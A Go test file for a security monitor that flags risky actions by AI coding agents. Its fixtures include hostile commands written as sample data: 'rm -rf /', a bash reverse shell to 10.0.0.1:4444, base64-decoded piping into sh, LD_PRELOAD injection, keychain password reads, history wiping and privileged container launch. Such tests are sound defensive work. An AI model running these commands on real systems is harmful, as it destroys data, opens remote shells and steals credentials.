package monitor

import (
	"testing"
	"time"

	"github.com/Rafiki81/libagentmetrics/agent"
	"github.com/Rafiki81/libagentmetrics/config"
)

func newTestSecurityConfig() config.SecurityConfig {
	return config.DefaultConfig().Security
}

func newTestInstance(id string) *agent.Instance {
	return &agent.Instance{
		Info: agent.Info{ID: id, Name: "Test Agent " + id},
	}
}

func TestNewSecurityMonitor(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	if sm == nil {
		t.Fatal("NewSecurityMonitor returned nil")
	}
	if sm.maxEvents != 500 {
		t.Errorf("maxEvents = %d, want 500", sm.maxEvents)
	}
}

func TestNewSecurityMonitor_ZeroMaxEvents(t *testing.T) {
	cfg := newTestSecurityConfig()
	cfg.MaxEvents = 0
	sm := NewSecurityMonitor(cfg)
	if sm.maxEvents != 500 {
		t.Errorf("maxEvents = %d, want 500 (default)", sm.maxEvents)
	}
}

func TestCheckAgent_DangerousCommand(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "rm -rf /", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	if len(events) == 0 {
		t.Fatal("expected at least 1 security event for 'rm -rf /'")
	}
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatDangerousCommand {
			found = true
			if e.Severity != agent.SecSevCritical {
				t.Errorf("severity = %q, want CRITICAL", e.Severity)
			}
		}
	}
	if !found {
		t.Error("expected dangerous_command category event")
	}
}

func TestCheckAgent_PrivilegeEscalation(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "sudo rm -rf /tmp/cache", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatPermEscalation {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected perm_escalation event for sudo command")
	}
}

func TestCheckAgent_CodeInjection(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "python -c 'exec(\"import os\")'", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatCodeInjection {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected code_injection event for exec()")
	}
}

func TestCheckAgent_ReverseShell(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatReverseShell {
			found = true
			if e.Severity != agent.SecSevCritical {
				t.Errorf("severity = %q, want CRITICAL", e.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("expected reverse_shell event")
	}
}

func TestCheckAgent_Obfuscation(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "echo 'payload' | base64 --decode | sh", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatObfuscation {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected obfuscation event for base64 --decode")
	}
}

func TestCheckAgent_ContainerEscape(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "docker run --privileged ubuntu bash", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatContainerEscape {
			found = true
			if e.Severity != agent.SecSevCritical {
				t.Errorf("severity = %q, want CRITICAL", e.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("expected container_escape event")
	}
}

func TestCheckAgent_EnvManipulation(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "export LD_PRELOAD=/tmp/evil.so", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatEnvManipulation {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected env_manipulation event for LD_PRELOAD")
	}
}

func TestCheckAgent_CredentialAccess(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "security find-generic-password -s 'myservice'", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatCredentialAccess {
			found = true
			if e.Severity != agent.SecSevCritical {
				t.Errorf("severity = %q, want CRITICAL", e.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("expected credential_access event")
	}
}

func TestCheckAgent_LogTampering(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "history -c", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatLogTampering {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected log_tampering event for 'history -c'")
	}
}

func TestCheckAgent_RemoteAccess(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "ssh user@remote-server.com", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatRemoteAccess {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected remote_access event for ssh")
	}
}

func TestCheckAgent_RemoteAccess_SkipSshAgent(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "ssh-agent bash", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	for _, e := range events {
		if e.Category == agent.SecCatRemoteAccess {
			t.Error("ssh-agent should be skipped, not flagged as remote access")
		}
	}
}

func TestCheckAgent_SystemModify(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "crontab -e", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatSystemModify {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected system_modify event for crontab")
	}
}

func TestCheckAgent_SensitiveFile(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.FileOps = []agent.FileOperation{
		{Op: "MODIFY", Path: "/home/user/.env"},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatSensitiveFile {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected sensitive_file event for .env")
	}
}

func TestCheckAgent_MassDeletion(t *testing.T) {
	cfg := newTestSecurityConfig()
	cfg.MassDeletionThreshold = 5
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	for i := 0; i < 10; i++ {
		inst.FileOps = append(inst.FileOps, agent.FileOperation{
			Op:   "DELETE",
			Path: "/home/user/project/file" + string(rune('a'+i)),
		})
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatMassDeletion {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected mass_deletion event")
	}
}

func TestCheckAgent_SecretsExposure(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.FileOps = []agent.FileOperation{
		{Op: "CREATE", Path: "/home/user/project/api_key.txt"},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatSecretsExposure {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected secrets_exposure event for api_key.txt")
	}
}

func TestCheckAgent_SuspiciousNetwork(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.NetConns = []agent.NetConnection{
		{RemoteAddr: "pastebin.com:443", LocalAddr: "127.0.0.1:54321", Protocol: "tcp", State: "ESTABLISHED"},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatSuspiciousNet {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected suspicious_network event for pastebin.com")
	}
}

func TestCheckAgent_UnusualPort(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.NetConns = []agent.NetConnection{
		{RemoteAddr: "192.168.1.1:31337", LocalAddr: "127.0.0.1:54321", Protocol: "tcp", State: "ESTABLISHED"},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatNetworkExfil {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected network_exfil event for unusual port 31337")
	}
}

func TestCheckAgent_ShellPersistence(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.FileOps = []agent.FileOperation{
		{Op: "MODIFY", Path: "/Users/dev/.zshrc"},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatShellPersistence {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected shell_persistence event for .zshrc modification")
	}
}

func TestCheckAgent_PackageInstallUnverified(t *testing.T) {
	cfg := newTestSecurityConfig()
	cfg.AllowedRegistries = []string{"npmjs.com", "pypi.org"}
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "npm install evil-package", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatPackageInstall {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected package_install event for unverified registry")
	}
}

func TestCheckAgent_Disabled(t *testing.T) {
	cfg := newTestSecurityConfig()
	cfg.Enabled = false
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "rm -rf /", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	if len(events) != 0 {
		t.Errorf("got %d events with disabled security, want 0", len(events))
	}
}

func TestCheckAgent_NoEvents_SafeActivity(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "go test ./...", Timestamp: time.Now()},
		{Command: "git status", Timestamp: time.Now()},
	}
	inst.FileOps = []agent.FileOperation{
		{Op: "MODIFY", Path: "/home/user/project/main.go"},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	if len(events) != 0 {
		t.Errorf("got %d events for safe activity, want 0. Events: %+v", len(events), events)
	}
}

func TestCheckAgent_Dedup(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "rm -rf /", Timestamp: time.Now()},
	}
	// Check twice — dedup should prevent duplicate
	sm.CheckAgent(inst)
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	dangerousCount := 0
	for _, e := range events {
		if e.Category == agent.SecCatDangerousCommand && e.Detail == "rm -rf /" {
			dangerousCount++
		}
	}
	if dangerousCount > 1 {
		t.Errorf("got %d duplicate dangerous_command events, want 1 (dedup)", dangerousCount)
	}
}

func TestCheckAgent_BlockedField(t *testing.T) {
	cfg := newTestSecurityConfig()
	cfg.BlockDangerousCommands = true
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "rm -rf /", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	events := sm.GetEvents()
	found := false
	for _, e := range events {
		if e.Category == agent.SecCatDangerousCommand {
			found = true
			if !e.Blocked {
				t.Error("expected Blocked=true when BlockDangerousCommands is enabled")
			}
		}
	}
	if !found {
		t.Error("expected dangerous_command event")
	}
}

func TestEventCounts(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "rm -rf /", Timestamp: time.Now()},                       // Critical
		{Command: "crontab -e", Timestamp: time.Now()},                     // Medium
		{Command: "export LD_PRELOAD=/tmp/evil.so", Timestamp: time.Now()}, // High
	}
	inst.NetConns = []agent.NetConnection{
		{RemoteAddr: "192.168.1.1:31337", LocalAddr: "127.0.0.1:54321", Protocol: "tcp", State: "ESTABLISHED"}, // Low
	}
	sm.CheckAgent(inst)
	total := 0
	low, medium, high, critical := sm.EventCounts()
	total = low + medium + high + critical
	if total == 0 {
		t.Error("expected some events")
	}
	if critical == 0 {
		t.Error("expected at least 1 critical event")
	}
}

func TestGetRecentEvents(t *testing.T) {
	cfg := newTestSecurityConfig()
	sm := NewSecurityMonitor(cfg)
	inst := newTestInstance("test")
	inst.Terminal.RecentCommands = []agent.TerminalCommand{
		{Command: "rm -rf /", Timestamp: time.Now()},
	}
	sm.CheckAgent(inst)
	recent := sm.GetRecentEvents(5)
	if len(recent) == 0 {
		t.Error("expected recent events in 5 min window")
	}
	old := sm.GetRecentEvents(0)
	if len(old) != 0 {
		t.Errorf("got %d events for 0 min window, want 0", len(old))
	}
}
